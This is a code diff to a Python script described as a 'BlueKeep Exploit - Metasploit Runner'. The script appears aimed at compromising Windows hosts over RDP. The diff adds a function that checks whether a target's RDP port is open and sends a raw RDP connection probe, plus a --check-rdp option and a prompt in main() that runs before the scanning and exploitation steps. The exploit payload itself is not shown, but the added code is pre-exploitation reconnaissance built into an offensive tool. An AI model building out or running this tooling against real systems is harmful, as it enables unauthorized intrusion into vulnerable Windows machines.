@@ -196,6 +196,58 @@ def detect_windows_version(target_ip, target_port=3389, verbose=False):
             os.remove(os_script_name)
         return 2
 
+def verify_rdp_service(target_ip, target_port=3389, verbose=False):
+    """
+    Verify that RDP service is actually running on the target before attempting to exploit.
+    Returns True if RDP is confirmed, False otherwise.
+    """
+    print(f"[*] Verifying RDP service on {target_ip}:{target_port}...")
+    
+    try:
+        # Basic port check
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        result = sock.connect_ex((target_ip, target_port))
+        sock.close()
+        
+        if result != 0:
+            print(f"[-] Port {target_port} is closed on {target_ip}")
+            print("[!] Cannot proceed with exploit - RDP port is not accessible")
+            return False
+            
+        # Send RDP protocol probe
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((target_ip, target_port))
+        
+        # RDP connection request
+        rdp_probe = bytes.fromhex("0300000b06e00000000000")
+        sock.send(rdp_probe)
+        
+        try:
+            response = sock.recv(1024)
+            if verbose:
+                print(f"[DEBUG] RDP probe response: {response.hex()}")
+                
+            if len(response) > 0 and response[0:1] == b'\x03':  # RDP protocol signature
+                print(f"[+] RDP service confirmed on {target_ip}:{target_port}")
+                sock.close()
+                return True
+            else:
+                print(f"[-] Received response but it does not appear to be RDP")
+                if verbose:
+                    print(f"[DEBUG] Response hex: {response.hex()}")
+                    
+                sock.close()
+                return False
+        except socket.timeout:
+            print(f"[-] Timeout waiting for response from {target_ip}")
+            sock.close()
+            return False
+    except Exception as e:
+        print(f"[-] Error verifying RDP service: {e}")
+        return False
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="BlueKeep Exploit - Metasploit Runner")
     parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
@@ -214,6 +266,7 @@ def parse_arguments():
     parser.add_argument("--scan-only", action="store_true", help="Only scan for vulnerability, don't exploit")
     parser.add_argument("-A", "--auto-target", action="store_true", 
                       help="Automatically detect OS version and select appropriate target")
+    parser.add_argument("--check-rdp", action="store_true", help="Verify RDP service before exploitation")
     return parser.parse_args()
 
 def main():
@@ -297,6 +350,16 @@ def main():
         print("[!] WARNING: Windows Server 2008 targets require fDisableCam=0 registry setting!")
     
     print()
+    
+    # Verify RDP service if requested
+    if args.check_rdp or args.debug:
+        import socket  # Import here to avoid potential issues if not needed
+        if not verify_rdp_service(args.rhost, args.rport, args.verbose or args.debug):
+            if input("RDP service verification failed. Continue anyway? (y/n): ").lower() != 'y':
+                print("[*] Exiting without exploitation")
+                return
+            else:
+                print("[!] Continuing despite RDP verification failure")
     
     # Run vulnerability scan if requested
     if args.scan or args.scan_only:
